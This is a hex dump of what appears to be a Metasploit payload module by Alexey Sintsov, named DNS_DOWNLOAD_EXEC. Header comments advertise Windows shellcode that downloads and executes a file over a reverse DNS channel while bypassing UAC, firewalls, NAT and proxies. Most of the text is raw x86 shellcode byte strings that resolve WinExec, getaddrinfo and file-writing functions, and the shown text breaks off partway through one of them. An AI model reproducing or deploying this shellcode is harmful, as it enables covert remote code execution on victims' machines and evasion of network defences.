00000000  23 23 0a 23 20 53 68 65  6c 6c 63 6f 64 65 3a 20  |##.# Shellcode: |
00000010  64 6f 77 6e 6c 6f 61 64  20 61 6e 64 20 65 78 65  |download and exe|
00000020  63 75 74 65 20 66 69 6c  65 20 76 69 61 20 72 65  |cute file via re|
00000030  76 65 72 73 65 20 44 4e  53 20 63 68 61 6e 6e 65  |verse DNS channe|
00000040  6c 0a 23 0a 23 0a 23 20  46 65 61 74 75 72 65 73  |l.#.#.# Features|
00000050  3a 0a 23 20 2a 20 57 69  6e 64 6f 77 73 20 37 20  |:.# * Windows 7 |
00000060  74 65 73 74 65 64 0a 23  20 2a 20 55 41 43 20 77  |tested.# * UAC w|
00000070  69 74 68 6f 75 74 20 77  6f 72 6b 20 28 73 76 63  |ithout work (svc|
00000080  68 6f 73 74 2e 65 78 65  20 6d 61 6b 65 73 20 72  |host.exe makes r|
00000090  65 71 75 65 73 74 73 20  76 69 61 20 67 65 74 61  |equests via geta|
000000a0  64 64 72 69 6e 66 6f 29  0a 23 20 2a 20 46 69 72  |ddrinfo).# * Fir|
000000b0  65 77 61 6c 6c 2f 52 6f  75 74 65 72 2f 4e 61 74  |ewall/Router/Nat|
000000c0  2f 50 72 6f 78 79 20 62  79 70 61 73 73 20 72 65  |/Proxy bypass re|
000000d0  76 65 72 73 65 20 63 6f  6e 6e 65 63 74 69 6f 6e  |verse connection|
000000e0  20 28 6c 69 6b 65 20 64  6e 73 63 61 74 20 64 6f  | (like dnscat do|
000000f0  2c 20 62 75 74 20 77 69  74 68 6f 75 74 20 73 6f  |, but without so|
00000100  63 6b 65 74 73 20 61 6e  64 20 73 74 61 62 6c 65  |ckets and stable|
00000110  21 29 0a 23 20 2a 20 4e  4f 20 53 4f 43 4b 45 54  |!).# * NO SOCKET|
00000120  0a 23 0a 23 20 44 4e 53  20 68 61 6e 64 6c 65 72  |.#.# DNS handler|
00000130  20 2d 20 68 74 74 70 3a  2f 2f 64 73 65 63 72 67  | - http://dsecrg|
00000140  2e 63 6f 6d 2f 66 69 6c  65 73 2f 70 75 62 2f 74  |.com/files/pub/t|
00000150  6f 6f 6c 73 2f 72 65 76  64 6e 73 2e 7a 69 70 0a  |ools/revdns.zip.|
00000160  23 0a 23 0a 23 20 42 79  20 41 6c 65 78 65 79 20  |#.#.# By Alexey |
00000170  53 69 6e 74 73 6f 76 0a  23 20 20 20 20 20 20 20  |Sintsov.#       |
00000180  5b 44 53 65 63 52 47 5d  0a 23 20 20 20 20 20 61  |[DSecRG].#     a|
00000190  2e 73 69 6e 74 73 6f 76  20 5b 73 6f 62 61 63 68  |.sintsov [sobach|
000001a0  6b 61 5d 20 64 73 65 63  72 67 2e 63 6f 6d 0a 23  |ka] dsecrg.com.#|
000001b0  20 20 20 20 20 64 6f 6f  6b 69 65 20 5b 73 6f 62  |     dookie [sob|
000001c0  61 63 68 6b 61 5d 20 69  6e 62 6f 78 2e 72 75 0a  |achka] inbox.ru.|
000001d0  23 0a 23 20 50 2e 53 2e  20 57 6f 72 6b 73 20 77  |#.# P.S. Works w|
000001e0  69 74 68 20 20 56 69 73  74 61 2f 37 2f 32 30 30  |ith  Vista/7/200|
000001f0  38 0a 23 20 20 20 20 20  20 20 64 6f 20 6e 6f 74  |8.#       do not|
00000200  20 77 6f 72 6b 20 69 6e  20 58 50 2f 32 30 30 33  | work in XP/2003|
00000210  20 62 65 63 61 75 73 65  20 74 68 72 65 20 61 72  | because thre ar|
00000220  65 20 6e 6f 20 49 50 76  36 20 62 79 20 64 65 66  |e no IPv6 by def|
00000230  61 75 6c 74 2e 0a 23 20  20 20 20 20 20 20 63 61  |ault..#       ca|
00000240  6e 20 77 6f 72 6b 20 69  6e 20 58 50 2f 32 30 30  |n work in XP/200|
00000250  33 20 69 66 20 49 50 76  36 20 69 6e 73 74 61 6c  |3 if IPv6 instal|
00000260  6c 65 64 0a 23 20 20 20  20 20 20 20 28 69 74 20  |led.#       (it |
00000270  69 73 20 6e 6f 74 20 6e  65 65 64 20 74 6f 20 62  |is not need to b|
00000280  65 20 65 6e 61 62 6c 65  64 2c 20 6a 75 73 74 20  |e enabled, just |
00000290  69 6e 73 74 61 6c 6c 65  64 29 0a 20 0a 72 65 71  |installed). .req|
000002a0  75 69 72 65 20 27 6d 73  66 2f 63 6f 72 65 27 0a  |uire 'msf/core'.|
000002b0  20 0a 6d 6f 64 75 6c 65  20 4d 65 74 61 73 70 6c  | .module Metaspl|
000002c0  6f 69 74 33 0a 20 0a 20  20 20 20 69 6e 63 6c 75  |oit3. .    inclu|
000002d0  64 65 20 4d 73 66 3a 3a  50 61 79 6c 6f 61 64 3a  |de Msf::Payload:|
000002e0  3a 57 69 6e 64 6f 77 73  0a 20 20 20 20 69 6e 63  |:Windows.    inc|
000002f0  6c 75 64 65 20 4d 73 66  3a 3a 50 61 79 6c 6f 61  |lude Msf::Payloa|
00000300  64 3a 3a 53 69 6e 67 6c  65 0a 20 0a 20 20 20 20  |d::Single. .    |
00000310  64 65 66 20 69 6e 69 74  69 61 6c 69 7a 65 28 69  |def initialize(i|
00000320  6e 66 6f 20 3d 20 7b 7d  29 0a 20 20 20 20 20 20  |nfo = {}).      |
00000330  20 20 73 75 70 65 72 28  75 70 64 61 74 65 5f 69  |  super(update_i|
00000340  6e 66 6f 28 69 6e 66 6f  2c 0a 20 20 20 20 20 20  |nfo(info,.      |
00000350  20 20 20 20 20 20 27 4e  61 6d 65 27 20 20 20 20  |      'Name'    |
00000360  20 20 20 20 20 20 3d 3e  20 27 44 4e 53 5f 44 4f  |      => 'DNS_DO|
00000370  57 4e 4c 4f 41 44 5f 45  58 45 43 27 2c 0a 20 20  |WNLOAD_EXEC',.  |
00000380  20 20 20 20 20 20 20 20  20 20 27 56 65 72 73 69  |          'Versi|
00000390  6f 6e 27 20 20 20 20 20  20 20 3d 3e 20 27 30 2e  |on'       => '0.|
000003a0  30 31 27 2c 0a 20 20 20  20 20 20 20 20 20 20 20  |01',.           |
000003b0  20 27 44 65 73 63 72 69  70 74 69 6f 6e 27 20 20  | 'Description'  |
000003c0  20 3d 3e 20 27 44 6f 77  6e 6c 6f 61 64 20 61 6e  | => 'Download an|
000003d0  64 20 45 78 65 63 20 28  76 69 61 20 44 4e 53 29  |d Exec (via DNS)|
000003e0  27 2c 0a 20 20 20 20 20  20 20 20 20 20 20 20 27  |',.            '|
000003f0  41 75 74 68 6f 72 27 20  20 20 20 20 20 20 20 3d  |Author'        =|
00000400  3e 20 5b 20 27 41 6c 65  78 65 79 20 53 69 6e 74  |> [ 'Alexey Sint|
00000410  73 6f 76 27 20 5d 2c 0a  20 20 20 20 20 20 20 20  |sov' ],.        |
00000420  20 20 20 20 27 4c 69 63  65 6e 73 65 27 20 20 20  |    'License'   |
00000430  20 20 20 20 3d 3e 20 4d  53 46 5f 4c 49 43 45 4e  |    => MSF_LICEN|
00000440  53 45 2c 0a 20 20 20 20  20 20 20 20 20 20 20 20  |SE,.            |
00000450  27 50 6c 61 74 66 6f 72  6d 27 20 20 20 20 20 20  |'Platform'      |
00000460  3d 3e 20 27 77 69 6e 27  2c 0a 20 20 20 20 20 20  |=> 'win',.      |
00000470  20 20 20 20 20 20 27 41  72 63 68 27 20 20 20 20  |      'Arch'    |
00000480  20 20 20 20 20 20 3d 3e  20 41 52 43 48 5f 58 38  |      => ARCH_X8|
00000490  36 2c 0a 20 20 20 20 20  20 20 20 20 20 20 20 27  |6,.            '|
000004a0  50 61 79 6c 6f 61 64 27  20 20 20 20 20 20 20 3d  |Payload'       =|
000004b0  3e 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |>.              |
000004c0  20 20 7b 0a 20 20 20 20  20 20 20 20 20 20 20 20  |  {.            |
000004d0  20 20 20 20 20 20 20 20  27 4f 66 66 73 65 74 73  |        'Offsets|
000004e0  27 20 3d 3e 7b 20 7d 2c  0a 20 20 20 20 20 20 20  |' =>{ },.       |
000004f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 0a 20  |              . |
00000500  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000510  20 20 20 27 42 65 67 69  6e 27 20 3d 3e 20 22 5c  |   'Begin' => "\|
00000520  78 65 62 5c 78 30 32 5c  78 65 62 5c 78 37 41 5c  |xeb\x02\xeb\x7A\|
00000530  78 65 38 5c 78 66 39 5c  78 66 66 5c 78 66 66 5c  |xe8\xf9\xff\xff\|
00000540  78 66 66 5c 78 34 37 5c  78 36 35 5c 78 37 34 5c  |xff\x47\x65\x74\|
00000550  78 35 30 5c 78 37 32 5c  78 36 46 5c 78 36 33 5c  |x50\x72\x6F\x63\|
00000560  78 34 31 5c 78 36 34 5c  78 36 34 5c 78 37 32 5c  |x41\x64\x64\x72\|
00000570  78 36 35 5c 78 37 33 5c  78 37 33 5c 78 46 46 5c  |x65\x73\x73\xFF\|
00000580  78 34 37 5c 78 36 35 5c  78 37 34 5c 78 35 34 5c  |x47\x65\x74\x54\|
00000590  78 36 35 5c 78 36 64 5c  78 37 30 5c 78 35 30 5c  |x65\x6d\x70\x50\|
000005a0  78 36 31 5c 78 37 34 5c  78 36 38 5c 78 34 31 5c  |x61\x74\x68\x41\|
000005b0  78 46 46 5c 78 46 46 5c  78 46 46 5c 78 46 46 5c  |xFF\xFF\xFF\xFF\|
*
000005d0  78 35 37 5c 78 36 39 5c  78 36 45 5c 78 34 35 5c  |x57\x69\x6E\x45\|
000005e0  78 37 38 5c 78 36 35 5c  78 36 33 5c 78 46 46 5c  |x78\x65\x63\xFF\|
000005f0  78 34 35 5c 78 37 38 5c  78 36 39 5c 78 37 34 5c  |x45\x78\x69\x74\|
00000600  78 35 34 5c 78 36 38 5c  78 37 32 5c 78 36 35 5c  |x54\x68\x72\x65\|
00000610  78 36 31 5c 78 36 34 5c  78 66 66 5c 78 34 43 5c  |x61\x64\xff\x4C\|
00000620  78 36 46 5c 78 36 31 5c  78 36 34 5c 78 34 43 5c  |x6F\x61\x64\x4C\|
00000630  78 36 39 5c 78 36 32 5c  78 37 32 5c 78 36 31 5c  |x69\x62\x72\x61\|
00000640  78 37 32 5c 78 37 39 5c  78 34 31 5c 78 46 46 5c  |x72\x79\x41\xFF\|
00000650  78 37 37 5c 78 37 33 5c  78 33 32 5c 78 35 66 5c  |x77\x73\x32\x5f\|
00000660  78 33 33 5c 78 33 32 5c  78 46 46 5c 78 35 37 5c  |x33\x32\xFF\x57\|
00000670  78 35 33 5c 78 34 31 5c  78 35 33 5c 78 37 34 5c  |x53\x41\x53\x74\|
00000680  78 36 31 5c 78 37 32 5c  78 37 34 5c 78 37 35 5c  |x61\x72\x74\x75\|
00000690  78 37 30 5c 78 46 46 5c  78 36 37 5c 78 36 35 5c  |x70\xFF\x67\x65\|
000006a0  78 37 34 5c 78 36 31 5c  78 36 34 5c 78 36 34 5c  |x74\x61\x64\x64\|
000006b0  78 37 32 5c 78 36 39 5c  78 36 65 5c 78 36 36 5c  |x72\x69\x6e\x66\|
000006c0  78 36 66 5c 78 46 46 5c  78 36 64 5c 78 37 33 5c  |x6f\xFF\x6d\x73\|
000006d0  78 37 36 5c 78 36 33 5c  78 37 32 5c 78 37 34 5c  |x76\x63\x72\x74\|
000006e0  78 46 46 5c 78 36 36 5c  78 36 66 5c 78 37 30 5c  |xFF\x66\x6f\x70\|
000006f0  78 36 35 5c 78 36 65 5c  78 46 46 5c 78 36 36 5c  |x65\x6e\xFF\x66\|
00000700  78 37 37 5c 78 37 32 5c  78 36 39 5c 78 37 34 5c  |x77\x72\x69\x74\|
00000710  78 36 35 5c 78 46 46 5c  78 45 42 5c 78 31 33 5c  |x65\xFF\xEB\x13\|
00000720  78 36 36 5c 78 36 33 5c  78 36 63 5c 78 36 66 5c  |x66\x63\x6c\x6f\|
00000730  78 37 33 5c 78 36 35 5c  78 46 46 22 2c 0a 20 20  |x73\x65\xFF",.  |
00000740  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000750  20 20 20 0a 20 20 20 20  20 20 20 20 20 20 20 20  |   .            |
00000760  20 20 20 20 20 20 20 20  27 50 61 79 6c 6f 61 64  |        'Payload|
00000770  31 27 20 3d 3e 20 22 5c  78 46 46 5c 78 35 65 5c  |1' => "\xFF\x5e\|
00000780  78 33 33 5c 78 63 39 5c  78 62 31 5c 78 65 34 5c  |x33\xc9\xb1\xe4\|
00000790  78 38 62 5c 78 64 31 5c  78 32 62 5c 78 65 32 5c  |x8b\xd1\x2b\xe2\|
000007a0  78 38 62 5c 78 66 63 5c  78 66 33 5c 78 61 34 5c  |x8b\xfc\xf3\xa4\|
000007b0  78 33 33 5c 78 63 30 5c  78 38 62 5c 78 66 63 5c  |x33\xc0\x8b\xfc\|
000007c0  78 38 41 5c 78 30 34 5c  78 33 39 5c 78 33 41 5c  |x8A\x04\x39\x3A\|
000007d0  78 43 41 5c 78 37 34 5c  78 30 44 5c 78 33 43 5c  |xCA\x74\x0D\x3C\|
000007e0  78 46 46 5c 78 37 34 5c  78 30 33 5c 78 34 31 5c  |xFF\x74\x03\x41\|
000007f0  78 45 42 5c 78 46 32 5c  78 38 38 5c 78 32 43 5c  |xEB\xF2\x88\x2C\|
00000800  78 33 39 5c 78 34 31 5c  78 45 42 5c 78 45 43 5c  |x39\x41\xEB\xEC\|
00000810  78 65 62 5c 78 37 38 5c  78 33 31 5c 78 43 39 5c  |xeb\x78\x31\xC9\|
00000820  78 36 34 5c 78 38 42 5c  78 37 31 5c 78 33 30 5c  |x64\x8B\x71\x30\|
00000830  78 38 42 5c 78 37 36 5c  78 30 43 5c 78 38 42 5c  |x8B\x76\x0C\x8B\|
00000840  78 37 36 5c 78 31 43 5c  78 38 42 5c 78 35 65 5c  |x76\x1C\x8B\x5e\|
00000850  78 30 38 5c 78 38 42 5c  78 37 45 5c 78 32 30 5c  |x08\x8B\x7E\x20\|
00000860  78 33 33 5c 78 65 64 5c  78 38 33 5c 78 63 35 5c  |x33\xed\x83\xc5\|
00000870  78 31 38 5c 78 38 42 5c  78 33 36 5c 78 36 36 5c  |x18\x8B\x36\x66\|
00000880  78 33 39 5c 78 30 43 5c  78 32 46 5c 78 37 35 5c  |x39\x0C\x2F\x75\|
00000890  78 65 64 5c 78 38 42 5c  78 37 33 5c 78 33 43 5c  |xed\x8B\x73\x3C\|
000008a0  78 38 42 5c 78 37 34 5c  78 31 45 5c 78 37 38 5c  |x8B\x74\x1E\x78\|
000008b0  78 30 33 5c 78 46 33 5c  78 38 42 5c 78 37 45 5c  |x03\xF3\x8B\x7E\|
000008c0  78 32 30 5c 78 30 33 5c  78 46 42 5c 78 38 42 5c  |x20\x03\xFB\x8B\|
000008d0  78 34 45 5c 78 31 34 5c  78 33 33 5c 78 45 44 5c  |x4E\x14\x33\xED\|
000008e0  78 35 36 5c 78 35 37 5c  78 35 31 5c 78 38 42 5c  |x56\x57\x51\x8B\|
000008f0  78 33 46 5c 78 30 33 5c  78 46 42 5c 78 38 42 5c  |x3F\x03\xFB\x8B\|
00000900  78 46 32 5c 78 36 41 5c  78 30 45 5c 78 35 39 5c  |xF2\x6A\x0E\x59\|
00000910  78 46 33 5c 78 41 36 5c  78 37 34 5c 78 30 38 5c  |xF3\xA6\x74\x08\|
00000920  78 35 39 5c 78 35 46 5c  78 38 33 5c 78 43 37 5c  |x59\x5F\x83\xC7\|
00000930  78 30 34 5c 78 34 35 5c  78 45 32 5c 78 45 39 5c  |x04\x45\xE2\xE9\|
00000940  78 35 39 5c 78 35 46 5c  78 35 45 5c 78 38 42 5c  |x59\x5F\x5E\x8B\|
00000950  78 43 44 5c 78 38 42 5c  78 34 36 5c 78 32 34 5c  |xCD\x8B\x46\x24\|
00000960  78 30 33 5c 78 43 33 5c  78 44 31 5c 78 45 31 5c  |x03\xC3\xD1\xE1\|
00000970  78 30 33 5c 78 43 31 5c  78 33 33 5c 78 43 39 5c  |x03\xC1\x33\xC9\|
00000980  78 36 36 5c 78 38 42 5c  78 30 38 5c 78 38 42 5c  |x66\x8B\x08\x8B\|
00000990  78 34 36 5c 78 31 43 5c  78 30 33 5c 78 43 33 5c  |x46\x1C\x03\xC3\|
000009a0  78 43 31 5c 78 45 31 5c  78 30 32 5c 78 30 33 5c  |xC1\xE1\x02\x03\|
000009b0  78 43 38 5c 78 38 42 5c  78 30 31 5c 78 30 33 5c  |xC8\x8B\x01\x03\|
000009c0  78 43 33 5c 78 38 42 5c  78 46 41 5c 78 38 42 5c  |xC3\x8B\xFA\x8B\|
000009d0  78 46 37 5c 78 38 33 5c  78 43 36 5c 78 30 45 5c  |xF7\x83\xC6\x0E\|
000009e0  78 38 42 5c 78 44 30 5c  78 36 41 5c 78 30 34 5c  |x8B\xD0\x6A\x04\|
000009f0  78 35 39 5c 78 43 33 5c  78 38 62 5c 78 64 34 5c  |x59\xC3\x8b\xd4\|
00000a00  78 65 38 5c 78 38 31 5c  78 66 66 5c 78 66 66 5c  |xe8\x81\xff\xff\|
00000a10  78 66 66 5c 78 35 30 5c  78 33 33 5c 78 63 30 5c  |xff\x50\x33\xc0\|
00000a20  78 62 30 5c 78 30 66 5c  78 30 33 5c 78 66 38 5c  |xb0\x0f\x03\xf8\|
00000a30  78 35 37 5c 78 35 33 5c  78 66 66 5c 78 64 32 5c  |x57\x53\xff\xd2\|
00000a40  78 35 30 5c 78 33 33 5c  78 63 30 5c 78 62 30 5c  |x50\x33\xc0\xb0\|
00000a50  78 31 34 5c 78 30 33 5c  78 66 38 5c 78 35 37 5c  |x14\x03\xf8\x57\|
00000a60  78 35 33 5c 78 66 66 5c  78 35 34 5c 78 32 34 5c  |x53\xff\x54\x24\|
00000a70  78 30 63 5c 78 35 30 5c  78 33 33 5c 78 63 30 5c  |x0c\x50\x33\xc0\|
00000a80  78 62 30 5c 78 30 38 5c  78 30 33 5c 78 66 38 5c  |xb0\x08\x03\xf8\|
00000a90  78 35 37 5c 78 35 33 5c  78 66 66 5c 78 35 34 5c  |x57\x53\xff\x54\|
00000aa0  78 32 34 5c 78 31 30 5c  78 35 30 5c 78 33 33 5c  |x24\x10\x50\x33\|
00000ab0  78 63 30 5c 78 62 30 5c  78 30 62 5c 78 30 33 5c  |xc0\xb0\x0b\x03\|
00000ac0  78 66 38 5c 78 35 37 5c  78 35 33 5c 78 66 66 5c  |xf8\x57\x53\xff\|
00000ad0  78 35 34 5c 78 32 34 5c  78 31 34 5c 78 35 30 5c  |x54\x24\x14\x50\|
00000ae0  78 38 62 5c 78 63 37 5c  78 38 33 5c 78 63 30 5c  |x8b\xc7\x83\xc0\|
00000af0  78 30 64 5c 78 35 30 5c  78 66 66 5c 78 35 34 5c  |x0d\x50\xff\x54\|
00000b00  78 32 34 5c 78 30 34 5c  78 38 62 5c 78 64 38 5c  |x24\x04\x8b\xd8\|
00000b10  78 33 33 5c 78 63 30 5c  78 62 30 5c 78 31 34 5c  |x33\xc0\xb0\x14\|
00000b20  78 30 33 5c 78 66 38 5c  78 35 37 5c 78 35 33 5c  |x03\xf8\x57\x53\|
00000b30  78 66 66 5c 78 35 34 5c  78 32 34 5c 78 31 38 5c  |xff\x54\x24\x18\|
00000b40  78 35 30 5c 78 33 33 5c  78 63 30 5c 78 62 30 5c  |x50\x33\xc0\xb0\|
00000b50  78 30 62 5c 78 30 33 5c  78 66 38 5c 78 35 37 5c  |x0b\x03\xf8\x57\|
00000b60  78 35 33 5c 78 66 66 5c  78 35 34 5c 78 32 34 5c  |x53\xff\x54\x24\|
00000b70  78 31 43 5c 78 35 30 5c  78 38 33 5c 78 63 37 5c  |x1C\x50\x83\xc7\|
00000b80  78 30 63 5c 78 35 37 5c  78 66 66 5c 78 35 34 5c  |x0c\x57\xff\x54\|
00000b90  78 32 34 5c 78 30 63 5c  78 38 62 5c 78 64 38 5c  |x24\x0c\x8b\xd8\|
00000ba0  78 38 33 5c 78 63 37 5c  78 30 37 5c 78 35 37 5c  |x83\xc7\x07\x57\|
00000bb0  78 35 33 5c 78 66 66 5c  78 35 34 5c 78 32 34 5c  |x53\xff\x54\x24\|
00000bc0  78 32 30 5c 78 35 30 5c  78 38 33 5c 78 63 37 5c  |x20\x50\x83\xc7\|
00000bd0  78 30 36 5c 78 35 37 5c  78 35 33 5c 78 66 66 5c  |x06\x57\x53\xff\|
00000be0  78 35 34 5c 78 32 34 5c  78 32 34 5c 78 35 30 5c  |x54\x24\x24\x50\|
00000bf0  78 35 30 5c 78 38 62 5c  78 66 34 5c 78 38 33 5c  |x50\x8b\xf4\x83\|
00000c00  78 63 37 5c 78 30 39 5c  78 35 37 5c 78 35 33 5c  |xc7\x09\x57\x53\|
00000c10  78 66 66 5c 78 35 34 5c  78 32 34 5c 78 32 63 5c  |xff\x54\x24\x2c\|
00000c20  78 35 30 5c 78 33 33 5c  78 63 30 5c 78 62 34 5c  |x50\x33\xc0\xb4\|
00000c30  78 30 33 5c 78 32 62 5c  78 65 30 5c 78 38 62 5c  |x03\x2b\xe0\x8b\|
00000c40  78 63 63 5c 78 35 31 5c  78 35 30 5c 78 66 66 5c  |xcc\x51\x50\xff\|
00000c50  78 35 36 5c 78 32 30 5c  78 30 33 5c 78 65 30 5c  |x56\x20\x03\xe0\|
00000c60  78 35 39 5c 78 35 39 5c  78 38 62 5c 78 63 38 5c  |x59\x59\x8b\xc8\|
00000c70  78 62 38 22 2c 0a 20 20  20 20 20 20 20 20 20 20  |xb8",.          |
00000c80  20 20 20 20 20 20 20 20  20 20 20 0a 20 20 20 20  |           .    |
00000c90  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000ca0  27 50 61 79 6c 6f 61 64  32 27 20 3d 3e 20 22 5c  |'Payload2' => "\|
00000cb0  78 62 61 5c 78 30 31 5c  78 30 31 5c 78 30 31 5c  |xba\x01\x01\x01\|
00000cc0  78 30 31 5c 78 32 62 5c  78 63 32 5c 78 35 30 5c  |x01\x2b\xc2\x50\|
00000cd0  78 62 38 5c 78 37 39 5c  78 37 38 5c 78 36 66 5c  |xb8\x79\x78\x6f\|
00000ce0  78 32 65 5c 78 35 30 5c  78 32 62 5c 78 65 31 5c  |x2e\x50\x2b\xe1\|
00000cf0  78 38 62 5c 78 63 63 5c  78 33 33 5c 78 63 30 5c  |x8b\xcc\x33\xc0\|
00000d00  78 62 30 5c 78 37 37 5c  78 62 34 5c 78 36 32 5c  |xb0\x77\xb4\x62\|
00000d10  78 35 30 5c 78 35 34 5c  78 35 31 5c 78 66 66 5c  |x50\x54\x51\xff\|
00000d20  78 35 36 5c 78 30 38 5c  78 33 33 5c 78 64 32 5c  |x56\x08\x33\xd2\|
00000d30  78 62 36 5c 78 30 33 5c  78 62 32 5c 78 30 63 5c  |xb6\x03\xb2\x0c\|
00000d40  78 30 33 5c 78 65 32 5c  78 35 30 5c 78 33 33 5c  |x03\xe2\x50\x33\|
00000d50  78 63 30 5c 78 62 34 5c  78 30 35 5c 78 32 62 5c  |xc0\xb4\x05\x2b\|
00000d60  78 65 30 5c 78 35 34 5c  78 33 33 5c 78 63 30 5c  |xe0\x54\x33\xc0\|
00000d70  78 62 30 5c 78 30 32 5c  78 62 34 5c 78 30 32 5c  |xb0\x02\xb4\x02\|
00000d80  78 35 30 5c 78 66 66 5c  78 35 36 5c 78 31 30 5c  |x50\xff\x56\x10\|
00000d90  78 33 32 5c 78 63 39 5c  78 35 30 5c 78 38 30 5c  |x32\xc9\x50\x80\|
00000da0  78 66 39 5c 78 38 30 5c  78 37 34 5c 78 30 34 5c  |xf9\x80\x74\x04\|
00000db0  78 66 65 5c 78 63 31 5c  78 65 62 5c 78 66 36 5c  |xfe\xc1\xeb\xf6\|
00000dc0  78 38 33 5c 78 63 34 5c  78 31 30 5c 78 62 30 5c  |x83\xc4\x10\xb0\|
00000dd0  78 30 36 5c 78 35 30 5c  78 62 30 5c 78 30 31 5c  |x06\x50\xb0\x01\|
00000de0  78 35 30 5c 78 62 30 5c  78 31 37 5c 78 35 30 5c  |x50\xb0\x17\x50\|
00000df0  78 38 33 5c 78 65 63 5c  78 30 34 5c 78 38 42 5c  |x83\xec\x04\x8B\|
00000e00  78 45 43 5c 78 38 33 5c  78 43 37 5c 78 30 37 5c  |xEC\x83\xC7\x07\|
00000e10  78 38 33 5c 78 45 43 5c  78 32 30 5c 78 33 33 5c  |x83\xEC\x20\x33\|
00000e20  78 43 30 5c 78 38 41 5c  78 30 43 5c 78 33 38 5c  |xC0\x8A\x0C\x38\|
00000e30  78 38 38 5c 78 30 43 5c  78 30 34 5c 78 34 30 5c  |x88\x0C\x04\x40\|
00000e40  78 38 34 5c 78 43 39 5c  78 37 35 5c 78 46 35 5c  |x84\xC9\x75\xF5\|
00000e50  78 33 33 5c 78 63 30 5c  78 62 39 5c 78 36 31 5c  |x33\xc0\xb9\x61\|
00000e60  78 36 31 5c 78 36 31 5c  78 36 31 5c 78 38 62 5c  |x61\x61\x61\x8b\|
00000e70  78 64 39 5c 78 35 31 5c  78 38 62 5c 78 64 34 5c  |xd9\x51\x8b\xd4\|
00000e80  78 38 33 5c 78 63 32 5c  78 37 66 5c 78 35 32 5c  |x83\xc2\x7f\x52\|
00000e90  78 33 33 5c 78 64 32 5c  78 35 35 5c 78 35 32 5c  |x33\xd2\x55\x52\|
00000ea0  78 38 62 5c 78 64 34 5c  78 38 33 5c 78 63 32 5c  |x8b\xd4\x83\xc2\|
00000eb0  78 30 63 5c 78 35 32 5c  78 66 66 5c 78 35 36 5c  |x0c\x52\xff\x56\|
00000ec0  78 30 63 5c 78 35 39 5c  78 35 31 5c 78 38 35 5c  |x0c\x59\x51\x85\|
00000ed0  78 63 30 5c 78 37 35 5c  78 65 37 5c 78 33 33 5c  |xc0\x75\xe7\x33\|
00000ee0  78 44 42 5c 78 42 33 5c  78 65 65 5c 78 32 42 5c  |xDB\xB3\xee\x2B\|
00000ef0  78 45 33 5c 78 35 30 5c  78 38 62 5c 78 63 35 5c  |xE3\x50\x8b\xc5\|
00000f00  78 38 62 5c 78 34 30 5c  78 35 62 5c 78 38 62 5c  |x8b\x40\x5b\x8b\|
00000f10  78 34 38 5c 78 31 38 5c  78 38 62 5c 78 35 30 5c  |x48\x18\x8b\x50\|
00000f20  78 31 63 5c 78 38 33 5c  78 43 31 5c 78 30 38 5c  |x1c\x83\xC1\x08\|
00000f30  78 33 33 5c 78 43 30 5c  78 33 33 5c 78 46 46 5c  |x33\xC0\x33\xFF\|
00000f40  78 36 36 5c 78 38 42 5c  78 30 31 5c 78 36 36 5c  |x66\x8B\x01\x66\|
00000f50  78 33 64 5c 78 66 66 5c  78 66 66 5c 78 37 34 5c  |x3d\xff\xff\x74\|
00000f60  78 37 66 5c 78 38 62 5c  78 66 38 5c 78 63 31 5c  |x7f\x8b\xf8\xc1\|
00000f70  78 65 66 5c 78 30 38 5c  78 33 32 5c 78 65 34 5c  |xef\x08\x32\xe4\|
00000f80  78 35 62 5c 78 30 33 5c  78 66 62 5c 78 35 37 5c  |x5b\x03\xfb\x57\|
00000f90  78 36 36 5c 78 38 42 5c  78 35 39 5c 78 30 32 5c  |x66\x8B\x59\x02\|
00000fa0  78 36 36 5c 78 38 39 5c  78 35 63 5c 78 30 34 5c  |x66\x89\x5c\x04\|
00000fb0  78 30 34 5c 78 38 42 5c  78 37 39 5c 78 30 34 5c  |x04\x8B\x79\x04\|
00000fc0  78 38 39 5c 78 37 43 5c  78 30 34 5c 78 30 36 5c  |x89\x7C\x04\x06\|
00000fd0  78 38 42 5c 78 37 39 5c  78 30 38 5c 78 38 39 5c  |x8B\x79\x08\x89\|
00000fe0  78 37 43 5c 78 30 34 5c  78 30 41 5c 78 38 42 5c  |x7C\x04\x0A\x8B\|
00000ff0  78 37 39 5c 78 30 43 5c  78 38 39 5c 78 37 43 5c  |x79\x0C\x89\x7C\|
00001000  78 30 34 5c 78 30 45 5c  78 38 62 5c 78 63 32 5c  |x04\x0E\x8b\xc2\|
00001010  78 38 35 5c 78 63 30 5c  78 37 35 5c 78 62 62 5c  |x85\xc0\x75\xbb\|
00001020  78 35 38 5c 78 66 66 5c  78 37 36 5c 78 66 38 5c  |x58\xff\x76\xf8\|
00001030  78 35 30 5c 78 62 30 5c  78 30 31 5c 78 35 30 5c  |x50\xb0\x01\x50\|
00001040  78 38 62 5c 78 63 34 5c  78 38 33 5c 78 63 30 5c  |x8b\xc4\x83\xc0\|
00001050  78 30 63 5c 78 35 30 5c  78 66 66 5c 78 35 36 5c  |x0c\x50\xff\x56\|
00001060  78 30 34 5c 78 33 33 5c  78 63 30 5c 78 62 30 5c  |x04\x33\xc0\xb0\|
00001070  78 65 65 5c 78 30 33 5c  78 65 30 5c 78 35 38 5c  |xee\x03\xe0\x58\|
00001080  78 35 38 5c 78 35 38 5c  78 35 38 5c 78 35 38 5c  |x58\x58\x58\x58\|
00001090  78 32 44 5c 78 36 31 5c  78 36 31 5c 78 36 31 5c  |x2D\x61\x61\x61\|
000010a0  78 36 31 5c 78 43 30 5c  78 45 34 5c 78 30 34 5c  |x61\xC0\xE4\x04\|
000010b0  78 30 32 5c 78 43 34 5c  78 33 43 5c 78 46 46 5c  |x02\xC4\x3C\xFF\|
000010c0  78 37 35 5c 78 31 33 5c  78 38 41 5c 78 45 30 5c  |x75\x13\x8A\xE0\|
000010d0  78 34 30 5c 78 63 31 5c  78 65 38 5c 78 31 30 5c  |x40\xc1\xe8\x10\|
000010e0  78 33 63 5c 78 31 61 5c  78 37 35 5c 78 30 34 5c  |x3c\x1a\x75\x04\|
000010f0  78 66 65 5c 78 63 34 5c  78 33 32 5c 78 63 30 5c  |xfe\xc4\x32\xc0\|
00001100  78 63 31 5c 78 65 30 5c  78 31 30 5c 78 65 62 5c  |xc1\xe0\x10\xeb\|
